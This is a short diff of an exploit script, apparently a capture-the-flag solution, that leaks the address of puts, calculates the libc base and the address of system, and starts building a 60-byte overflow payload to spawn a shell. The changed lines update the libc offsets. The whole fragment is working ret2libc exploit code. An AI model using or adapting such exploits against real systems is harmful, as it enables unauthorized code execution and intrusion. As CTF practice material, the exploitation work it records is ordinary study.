@@ -10,10 +10,10 @@ puts_got = 0x0804a01c
 r.sendline(str(puts_got))
 r.recvuntil(": ")
 puts_adr = int(r.recvuntil("\n").strip(),16)
-puts_off = 0x5fca0
+puts_off = 0x672c0
 libc = puts_adr - puts_off
 print "libc : ",hex(libc)
-system = libc + 0x3ada0
+system = libc + 0x3cc70
 sh = 0x804929e
 r.recvuntil(":")
 payload = "a"*60
